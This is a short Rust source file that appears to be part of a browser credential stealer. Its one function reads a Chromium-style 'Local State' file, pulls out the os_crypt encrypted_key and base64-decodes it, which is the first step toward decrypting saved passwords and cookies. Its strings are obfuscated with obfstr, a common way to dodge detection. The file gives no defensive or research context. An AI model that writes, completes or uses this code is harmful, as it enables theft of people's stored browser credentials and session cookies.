use crate::base64::{base64_decode, base64_decode_string};
use crate::path::Path;
use alloc::vec::Vec;
use json::parse;
use obfstr::obfstr as s;

pub fn extract_master_key(user_data: &Path) -> Option<Vec<u8>> {
    let bytes = (user_data / s!("Local State")).read_file().ok()?;
    let parsed = parse(&bytes).unwrap();
    
    let key_in_base64 = parsed.get(s!("os_crypt"))?.get(s!("encrypted_key"))?.as_string()?.clone();
    base64_decode_string(&key_in_base64)
}